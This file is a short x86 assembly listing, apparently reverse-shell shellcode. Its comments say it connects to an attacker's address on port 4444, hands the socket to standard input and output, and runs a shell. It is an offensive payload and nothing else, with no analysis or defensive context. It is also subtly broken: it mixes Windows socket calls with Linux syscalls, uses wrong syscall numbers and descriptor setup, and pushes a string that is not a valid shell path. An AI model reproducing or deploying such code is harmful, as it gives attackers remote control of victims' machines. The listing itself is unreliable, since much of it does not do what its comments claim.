BITS 32
    
_start:
    ; create a socket
    push 2          ; AF_INET
    push 1          ; SOCK_STREAM
    push 0          ; IPPROTO_IP
    call WSASocketA
    mov ebx, eax    ; save the socket to a register
    
    ; connect to the attacker
    push word 0x5c11  ; attacker IP address (port 4444)
    push byte 0x7f
    push dword ebx  ; sockfd
    push word 0x02   ; AF_INET
    call connect
    
    ; duplicate stdin, stdout, stderr to the socket
    xor eax, eax
    mov al, 0x2 ; dup2 syscall
    mov ebx, dword [sockfd]
    mov ecx, eax ; fd = 0, stdin
    int 0x80
    mov ecx, eax ; fd = 1, stdout
    int 0x80
    mov ecx, eax ; fd = 2, stderr
    int 0x80
    
    ; execute a shell
    xor eax, eax
    push eax
    push 0x73752f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0x0b ; execve syscall
    int 0x80
    
sockfd:
    dd 0
    
connect:
    push ebp
    mov ebp, esp
    push 0x10
    pop ecx
    push ecx
    push dword [ebp+0x10]
    push dword [ebp+0x0C]
    push dword [ebp+0x08]
    call WS2_32.connect
    mov esp, ebp
    pop ebp
    ret
